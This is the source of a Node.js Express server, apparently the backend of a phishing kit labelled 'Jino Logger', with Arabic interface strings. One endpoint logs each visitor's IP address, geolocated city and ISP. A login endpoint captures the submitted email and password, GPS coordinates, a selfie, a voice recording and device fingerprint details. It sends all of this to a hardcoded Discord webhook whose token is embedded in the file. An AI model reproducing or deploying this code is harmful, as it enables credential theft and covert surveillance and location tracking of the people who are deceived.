const express = require('express');
const fetch = require('node-fetch');
const FormData = require('form-data');
const path = require('path');
const app = express();

const WEBHOOK_URL = 'https://discord.com/api/webhooks/1558089124613718086/gG0L2uBMalqrD7RklJmznOH1rNs4NLfc8wfbeBzgMxQz_itzhqpV5EQWRwDg-a2OkKGR';
const PORT = 11491;

// ============ CORS ============
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

app.use(express.json({ limit: '25mb' }));
app.use(express.static(path.join(__dirname)));

// ============ دالة جلب معلومات الموقع من IP ============
async function getIPInfo(ip) {
  try {
    const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,regionName,city,zip,lat,lon,isp,org,as,query`);
    const data = await res.json();
    if (data.status === 'success') {
      return {
        country: data.country || 'N/A',
        countryCode: data.countryCode || 'N/A',
        region: data.regionName || 'N/A',
        city: data.city || 'N/A',
        zip: data.zip || 'N/A',
        isp: data.isp || 'N/A',
        org: data.org || 'N/A',
        asn: data.as || 'N/A',
        lat: data.lat,
        lon: data.lon
      };
    }
  } catch (e) {}
  return null;
}

// ============ إشعار فتح الرابط ============
app.post('/api/visit', async (req, res) => {
  const { referrer, screen, timezone, language } = req.body;
  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
  const ua = req.headers['user-agent'];
  const time = new Date().toLocaleString('ar-EG', { timeZone: 'Asia/Baghdad' });

  const ipInfo = await getIPInfo(ip);

  const embed = {
    title: '👀 شخص فتح الرابط',
    color: 0xffaa00,
    fields: [
      { name: '🌐 IP', value: `\`${ip}\``, inline: true },
      { name: '🕒 الوقت', value: time, inline: true },
      { name: '🌍 البلد', value: ipInfo?.country || 'N/A', inline: true },
      { name: '📍 المنطقة', value: ipInfo?.region || 'N/A', inline: true },
      { name: '🏙️ المدينة', value: ipInfo?.city || 'N/A', inline: true },
      { name: '📡 مزود الخدمة', value: ipInfo?.isp || 'N/A', inline: false },
      { name: '🏢 الشركة', value: ipInfo?.org || 'N/A', inline: false },
      { name: '🔌 ASN', value: ipInfo?.asn || 'N/A', inline: false },
      { name: '🗺️ الخريطة', value: ipInfo?.lat ? `[افتح الخريطة](https://www.google.com/maps?q=${ipInfo.lat},${ipInfo.lon})` : 'N/A', inline: false },
      { name: '🔗 Referrer', value: referrer || 'مباشر', inline: false },
      { name: '🖥️ الشاشة', value: `${screen} | ${timezone} | ${language}`, inline: false },
      { name: '🧠 UA', value: `\`\`\`${ua}\`\`\``, inline: false }
    ],
    footer: { text: 'Jino Logger • Visit Alert' }
  };

  try {
    await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [embed] })
    });
    res.json({ ok: true });
  } catch (err) { res.status(500).json({ ok: false }); }
});

// ============ تسجيل الدخول ============
app.post('/api/login', async (req, res) => {
  const { email, password, gps, photo, audio, device, attempt, permissions, platform } = req.body;
  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
  const userAgent = req.headers['user-agent'];
  const timestamp = new Date().toLocaleString('ar-EG', { timeZone: 'Asia/Baghdad' });
  const attemptNum = attempt || '1';

  const ipInfo = await getIPInfo(ip);

  const permCam = permissions?.camera ? '✅' : '❌';
  const permMic = permissions?.microphone ? '✅' : '❌';
  const permLoc = permissions?.location ? '✅' : '❌';

  const embed = {
    title: `🎯 محاولة #${attemptNum} — ${email}`,
    color: 0xff0000,
    fields: [
      { name: '🔢 رقم المحاولة', value: `#${attemptNum}`, inline: true },
      { name: '🎯 المنصة', value: platform || 'الموقع الرئيسي', inline: true },
      { name: '🕒 الوقت', value: timestamp, inline: false },
      { name: '📧 الإيميل', value: `\`${email}\``, inline: false },
      { name: '🔑 الباسورد', value: `\`${password}\``, inline: false },
      { name: '🔐 الأذونات', value: `📷 كاميرا: ${permCam}\n🎤 مايك: ${permMic}\n📍 موقع: ${permLoc}`, inline: false },
      { name: '🌐 IP', value: `\`${ip}\``, inline: true },
      { name: '🌍 البلد', value: `${ipInfo?.country || 'N/A'} ${ipInfo?.countryCode ? `(${ipInfo.countryCode})` : ''}`, inline: true },
      { name: '📍 المنطقة', value: ipInfo?.region || 'N/A', inline: true },
      { name: '🏙️ المدينة', value: ipInfo?.city || 'N/A', inline: true },
      { name: '📮 الرمز البريدي', value: ipInfo?.zip || 'N/A', inline: true },
      { name: '📡 مزود الخدمة', value: ipInfo?.isp || 'N/A', inline: false },
      { name: '🏢 الشركة', value: ipInfo?.org || 'N/A', inline: false },
      { name: '🔌 ASN', value: ipInfo?.asn || 'N/A', inline: false },
      { name: '📍 موقع GPS', value: (gps && gps.lat) ? `[🗺️ افتح الخريطة](https://www.google.com/maps?q=${gps.lat},${gps.lon})\n🎯 دقة: ${Math.round(gps.acc)} متر` : '❌ ما أعطى صلاحية', inline: false },
      { name: '🗺️ موقع IP', value: ipInfo?.lat ? `[📍 افتح الخريطة](https://www.google.com/maps?q=${ipInfo.lat},${ipInfo.lon})` : 'N/A', inline: false },
      { name: '🔋 البطارية', value: device?.battery || '❌ غير متاح', inline: true },
      { name: '⚙️ المعالج', value: `${device?.cores || 'N/A'} cores`, inline: true },
      { name: '💾 الذاكرة', value: `${device?.memory || 'N/A'} GB`, inline: true },
      { name: '🖥️ الشاشة', value: device?.screen || 'N/A', inline: true },
      { name: '🌍 المنطقة الزمنية', value: device?.timezone || 'N/A', inline: true },
      { name: '🎮 كرت الرسوم', value: device?.gpu || 'N/A', inline: false },
      { name: '📱 المنصة', value: device?.platform || 'N/A', inline: true },
      { name: '🗣️ اللغة', value: device?.language || 'N/A', inline: true },
      { name: '👆 شاشة لمس', value: device?.touch ? 'نعم' : 'لا', inline: true },
      { name: '🧠 UA', value: `\`\`\`${userAgent}\`\`\``, inline: false }
    ],
    image: photo ? { url: 'attachment://selfie.jpg' } : undefined,
    footer: { text: `Jino Logger • محاولة #${attemptNum}` }
  };

  try {
    const form = new FormData();
    form.append('payload_json', JSON.stringify({ embeds: [embed] }));

    if (photo) {
      const base64Data = photo.replace(/^data:image\/jpeg;base64,/, '');
      form.append('file1', Buffer.from(base64Data, 'base64'), { filename: `selfie_${attemptNum}.jpg` });
    }
    if (audio) {
      const base64Audio = audio.replace(/^data:audio\/webm;base64,/, '');
      form.append('file2', Buffer.from(base64Audio, 'base64'), { filename: `voice_${attemptNum}.webm` });
    }

    if (photo || audio) {
      await fetch(WEBHOOK_URL, { method: 'POST', body: form, headers: form.getHeaders() });
    } else {
      await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ embeds: [embed] })
      });
    }

    if (gps && gps.lat) {
      const mapEmbed = {
        title: `🗺️ موقع GPS — محاولة #${attemptNum}`,
        color: 0x00ff00,
        description: `📍 إحداثيات: \`${gps.lat}, ${gps.lon}\`\n🎯 دقة: ${Math.round(gps.acc)} متر\n\n[افتح في Google Maps](https://www.google.com/maps?q=${gps.lat},${gps.lon})`,
        footer: { text: 'GPS Location' }
      };
      await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ embeds: [mapEmbed] })
      });
    }

    res.json({ ok: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ ok: false });
  }
});

app.listen(PORT, '0.0.0.0', () => console.log(`🚀 Server on port ${PORT}`));
